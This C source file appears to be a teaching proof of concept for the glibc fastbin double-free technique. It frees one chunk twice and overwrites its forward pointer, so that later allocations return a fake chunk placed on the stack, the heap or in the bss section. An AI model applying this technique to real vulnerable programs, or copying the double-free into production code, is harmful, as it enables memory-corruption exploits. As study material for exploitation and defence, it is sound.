#include <stdio.h>
#include <stdlib.h>

#define chunksize 0x8
#define fakesize 0x20

#define SIZE_SZ (sizeof(size_t))
#define MALLOC_ALIGN_MASK (2*SIZE_SZ - 1)
#define MIN_CHUNK_SIZE 24 /* 64 bit system */
//#define MIN_CHUNK_SIZE 12 /* 32 bit system */
#define MINSIZE  \
	(unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))

#define fastbin_index(sz) \
	((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
#define checked_request2size(req, sz)                             \
  (sz) = request2size (req);

typedef unsigned long long typeVar; /* 64 bit system */
//typedef int typeVar; /* 32 bit system */

typeVar bss_section;
int main()
{
	typeVar stack_var;

	int *a = malloc(chunksize);
	int *b = malloc(chunksize);
	int *c = malloc(chunksize);

	free(a);
	free(b);
	free(a);

	typeVar *d = malloc(chunksize); /* 1st malloc */
	int *e = malloc(chunksize); /* 2nd malloc */

	stack_var = fakesize;
	*e = fakesize;
	bss_section = fakesize;

	//*d = (typeVar) (((char*)&stack_var) - sizeof(d)); /* Duplicate chunk into stack */
	//*d = (typeVar) ((char *)e - sizeof(d)); /* Duplicate chunk into heap */
	*d = (typeVar) (((char*)&bss_section) - sizeof(d)); /* Duplicate chunk into bss section */
	
	size_t nb;	
	checked_request2size(chunksize, nb);
	printf("%x %x\n", fastbin_index(nb), fastbin_index(stack_var));
	
	printf("3rd malloc(%d): %p\n",chunksize, malloc(chunksize));
	printf("4rd malloc(%d): %p\n",chunksize, malloc(chunksize));

	return 0;
}
